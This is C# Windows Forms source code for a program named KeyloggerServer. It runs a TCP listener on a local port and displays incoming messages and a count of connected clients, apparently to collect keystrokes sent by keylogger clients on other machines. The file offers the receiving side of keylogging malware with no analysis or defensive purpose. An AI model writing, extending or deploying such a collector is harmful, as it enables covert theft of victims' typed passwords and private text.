using SimpleTCP;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net;

namespace KeyloggerServer
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }
        private SimpleTcpServer server;

        private void Form1_Load(object sender, EventArgs e)
        {
            server = new SimpleTcpServer
            {
                Delimiter = 0x13,
                StringEncoder = Encoding.UTF8
            };
            server.DataReceived += Server_DataReceived;
            server.ClientDisconnected += Server_ClientDisconnected;
            server.ClientConnected += Server_ClientConnected;
        }

        private void Server_ClientConnected(object sender, System.Net.Sockets.TcpClient e)
        {
            this.Invoke((MethodInvoker)delegate ()
            {
                this.Text = server.ConnectedClientsCount.ToString();
            });
        }

        private void Server_ClientDisconnected(object sender, System.Net.Sockets.TcpClient e)
        {
            richTextBox1.Invoke((MethodInvoker)delegate ()
            {
                richTextBox1.Text += $"Client Disconnected.{Environment.NewLine}";
            });
            this.Invoke((MethodInvoker)delegate ()
            {
                this.Text = server.ConnectedClientsCount.ToString();
            });
        }

        private void Server_DataReceived(object sender, SimpleTCP.Message e)
        {
            richTextBox1.Invoke((MethodInvoker)delegate ()
            {
                richTextBox1.Text += e.MessageString;
            });
            
        }

        private void button1_Click(object sender, EventArgs e)
        {
            IPAddress iP = IPAddress.Parse("127.0.0.1");
            server.Start(iP, 8910);
            button1.Enabled = false;
        }

        private void button2_Click(object sender, EventArgs e)
        {
            if (server.IsStarted)
            {
                server.Stop();
            }
            button1.Enabled = true;
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (server.IsStarted)
            {
                server.Stop();
            }
        }

        private void richTextBox1_TextChanged(object sender, EventArgs e)
        {
            if(richTextBox1.SelectionStart == richTextBox1.Text.Length)
            {
                richTextBox1.ScrollToCaret();
            }
        }
    }
}
